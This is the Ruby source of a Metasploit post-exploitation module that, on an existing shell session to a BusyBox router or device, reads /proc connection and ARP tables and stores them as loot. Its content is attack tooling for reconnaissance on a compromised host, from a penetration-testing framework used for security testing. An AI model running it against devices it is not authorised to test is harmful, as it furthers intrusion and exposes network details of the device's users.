##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::BusyBox

  FILES = [
    '/proc/net/nf_conntrack',
    '/proc/net/ip_conntrack',
    '/proc/net/tcp',
    '/proc/net/udp',
    '/proc/net/arp',
    '/proc/fcache/*'
  ]

  def initialize
    super(
      'Name'         => 'BusyBox Enumerate Connections',
      'Description'  => %q{
        This module will be applied on a session connected to a BusyBox shell. It will
        enumerate the connections established with the router or device executing BusyBox.
      },
      'Author'       => 'Javier Vicente Vallejo',
      'License'      => MSF_LICENSE,
      'Platform'     => ['linux'],
      'SessionTypes' => ['shell']
    )
  end

  def run
    found = false
    print_status('Searching for files that store information about network connections')
    FILES.each do |f|
      if busy_box_file_exist?(f)
        found = true
        print_good("Connections file found: #{f}.")
        read_connection_file(f)
      end
    end

    print_error('Any file with connections found') unless found
  end

  def read_connection_file(file)
    begin
      str_file=read_file(file)
      vprint_line(str_file)
      p = store_loot('busybox.enum.connections', 'text/plain', session, str_file, file, 'BusyBox Device Network Established Connections')
      print_good("Connections saved to #{p}")
    rescue EOFError
      print_error("Nothing read from file #{file}, file may be empty")
    end
  end
end
